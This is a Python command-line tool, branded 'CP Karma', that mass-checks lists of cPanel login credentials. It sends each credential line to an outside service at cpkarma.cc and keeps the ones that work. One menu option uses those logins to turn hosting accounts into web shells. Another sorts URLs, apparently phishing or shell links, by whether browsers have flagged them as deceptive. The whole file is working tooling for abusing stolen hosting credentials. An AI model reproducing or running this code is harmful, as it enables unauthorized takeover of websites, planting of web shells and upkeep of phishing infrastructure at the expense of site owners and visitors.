import requests
import os

# Color codes
class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[38;5;203m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    YELLOW_BG = '\033[43m'
    PINKY = '\033[38;5;209m'
    KEEN = '\033[38;5;50m'
    GEEN = '\033[38;5;42m'
    YOO = '\033[38;5;148m'
    LEEN = '\033[38;5;217m'
    PUR = '\033[38;5;96m'
    PUP = '\033[38;5;141m'
    WOO = '\033[38;5;66m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def valid_count(filename):
    count = sum(1 for line in open(filename))
    return count

def invalid_count(filename):
    count = sum(1 for line in open(filename))
    return count

def total_checked(filename):
    count = sum(1 for line in open(filename))
    return count

# Mass Cpanel Checker
def mass_cpanel_checker():
    clear_screen()
    print(colors.YELLOW_BG + colors.BOLD + "[ Main Menu ]" + colors.ENDC)
    print(colors.LEEN + "\n   [x]   Mass Cpanel Checker   [x]" + colors.ENDC)

    try:
        pok = input(colors.YOO + "\n   Enter CP Filename: " + colors.ENDC)
        pok2 = input(colors.YOO + "\n   Enter Save Filename: " + colors.ENDC)
        print("\n")

        valid_counter = 0
        invalid_counter = 0

        with open(pok, 'r') as file:
            for line in file:
                params_post = {"orion": line.strip()}
                try:
                    req = requests.post("https://cpkarma.cc/dPi/api.php", data=params_post, timeout=10)
                    result = req.text

                    if '"95f542">Working!' in result:
                        print(line.strip() + " > " + colors.OKGREEN + "Cpanel Working" + colors.ENDC)
                        with open(pok2, 'a') as save_file:
                            save_file.write(line.strip() + "\n")
                        valid_counter += 1
                    else:
                        print(line.strip() + " > " + colors.FAIL + "Cpanel Not Working" + colors.ENDC)
                        invalid_counter += 1

                except requests.Timeout:
                    print(line.strip() + " > " + colors.WARNING + "Request timeout" + colors.ENDC)
                    invalid_counter += 1

                except requests.ConnectionError:
                    print(line.strip() + " > " + colors.FAIL + "Connection Error" + colors.ENDC)
                    invalid_counter += 1

        print("\n   Result Saved On " + colors.OKCYAN + pok2 + colors.ENDC)
        print(colors.OKGREEN + "\n   Valid: " + str(valid_counter) + colors.ENDC)
        print(colors.FAIL + "   Invalid: " + str(invalid_counter) + colors.ENDC)
        print(colors.PUP + "   Total Checked: " + str(total_checked(pok)) + colors.ENDC)

    except FileNotFoundError:
        print("\n" + colors.FAIL + "File not found. Insert your filename like Cpanel.txt" + colors.ENDC)

# Mass Cpanel To Shell
def mass_cpanel_to_shell():
    clear_screen()
    print(colors.YELLOW_BG + colors.BOLD + "[ Main Menu ]" + colors.ENDC)
    print(colors.LEEN + "\n   [x]   Mass Cpanel To Shell   [x]" + colors.ENDC)

    try:
        pok = input(colors.YOO + "\n   Enter CP Filename: " + colors.ENDC)
        pok2 = input(colors.YOO + "\n   Enter Save Filename: " + colors.ENDC)
        print("\n")

        valid_counter = 0
        invalid_counter = 0

        with open(pok, 'r') as file:
            for line in file:
                params_post = {"orion": line.strip()}
                req = requests.post("https://cpkarma.cc/0xapi/api.php", data=params_post)
                result = req.text
                if '"95f542">Working!' in result:
                    print(line.strip() + " > " + colors.OKGREEN + "Converted to Shell" + colors.ENDC)
                    with open(pok2, 'a') as save_file:
                        save_file.write(line.strip() + "\n")
                    valid_counter += 1
                else:
                    print(line.strip() + " > " + colors.FAIL + "Unable to Convert" + colors.ENDC)
                    invalid_counter += 1

        print("\n   Result Saved On " + colors.OKCYAN + pok2 + colors.ENDC)
        print(colors.OKGREEN + "\n   Valid: " + str(valid_counter) + colors.ENDC)
        print(colors.FAIL + "   Invalid: " + str(invalid_counter) + colors.ENDC)
        print(colors.PUP + "   Total Checked: " + str(total_checked(pok)) + colors.ENDC)

    except FileNotFoundError:
        print("\n" + colors.FAIL + "File not found. Insert your filename like Cpanel.txt" + colors.ENDC)
# Mass Deceptive To Shell
def mass_deceptive_to_shell():
    clear_screen()
    print(colors.YELLOW_BG + colors.BOLD + "[ Main Menu ]" + colors.ENDC)
    print(colors.LEEN + "\n   [x]   Mass Deceptive URL Checker   [x]" + colors.ENDC)

    try:
        pok = input(colors.YOO + "\n   Enter URL Filename: " + colors.ENDC)
        pok2 = input(colors.YOO + "\n   Enter Save Filename: " + colors.ENDC)
        print("\n")

        valid_counter = 0
        invalid_counter = 0

        with open(pok, 'r') as file:
            for line in file:
                params_post = {"dope": line.strip()}
                req = requests.post("https://cpkarma.cc/deceptive/api.php", data=params_post)
                result = req.text
                if 'Not-Vulnerable' in result:
                    print(line.strip() + " > " + colors.OKGREEN + "Green URL" + colors.ENDC)
                    with open(pok2, 'a') as save_file:
                        save_file.write(line.strip() + "\n")
                    valid_counter += 1
                else:
                    print(line.strip() + " > " + colors.FAIL + "Red URL" + colors.ENDC)
                    invalid_counter += 1

        print("\n   Result Saved On " + colors.OKCYAN + pok2 + colors.ENDC)
        print(colors.OKGREEN + "\n   Valid: " + str(valid_counter) + colors.ENDC)
        print(colors.FAIL + "   Invalid: " + str(invalid_counter) + colors.ENDC)
        print(colors.PUP + "   Total Checked: " + str(total_checked(pok)) + colors.ENDC)

    except FileNotFoundError:
        print("\n" + colors.FAIL + "File not found. Insert your filename like URL.txt" + colors.ENDC)

def banner():
    YOO = '\033[38;5;148m'
    WOO = '\033[38;5;66m'
    banner_text = f'''
    {YOO}░█▀▀█ ░█▀▀█ 　 ░█─▄▀ ─█▀▀█ ░█▀▀█ ░█▀▄▀█ ─█▀▀█ 
    ░█─── ░█▄▄█ 　 ░█▀▄─ ░█▄▄█ ░█▄▄▀ ░█░█░█ ░█▄▄█ 
    ░█▄▄█ ░█─── 　 ░█─░█ ░█─░█ ░█─░█ ░█──░█ ░█─░█\033[0m
    
     {WOO}[x] Tool Owner - @xnabob\033[0m
     {WOO}[x] Tool Modified By - @MrBlack\033[0m
    '''
    print(banner_text)

# Main Menu
def main_menu():
    clear_screen()
    banner()
    print(colors.PUR + colors.BOLD + "\n   [------ Main Menu ------]" + colors.ENDC)
    print(colors.GEEN + colors.BOLD + "\n   Choose a Tool to Execute:" + colors.ENDC)
    print(colors.PINKY + "\n   1. Mass Cpanel Checker" + colors.ENDC)
    print(colors.PINKY + "\n   2. Mass Cpanel to Shell" + colors.ENDC)
    print(colors.PINKY + "\n   3. Mass Deceptive/Red Shell Checker" + colors.ENDC)
    print(colors.FAIL + "\n   0. Exit" + colors.ENDC)

    try:
        choice = int(input(colors.YOO + "\n   Enter your choice: " + colors.ENDC))
        if choice == 1:
            mass_cpanel_checker()
        elif choice == 2:
            mass_cpanel_to_shell()
        elif choice == 3:
            mass_deceptive_to_shell()
        elif choice == 0:
            clear_screen()
            print(colors.WOO + colors.BOLD + "\n   [x]------->>> Thank you for using the tool! Goodbye. <<<------- [x]\n" + colors.ENDC)
            exit()
        else:
            print(colors.FAIL + "   Invalid choice. Please enter a valid option." + colors.ENDC)
            input(colors.YOO + "\n   Press Enter to continue..." + colors.ENDC)
            main_menu()

    except ValueError:
        print(colors.FAIL + "Invalid choice. Please enter a valid option." + colors.ENDC)
        input(colors.YOO + "\nPress Enter to continue..." + colors.ENDC)
        main_menu()


# Entry point
if __name__ == "__main__":
    clear_screen()
    print(colors.BOLD + colors.PUP + "\nWelcome to Vintage Cpanel Tool!\n" + colors.ENDC)
    main_menu()
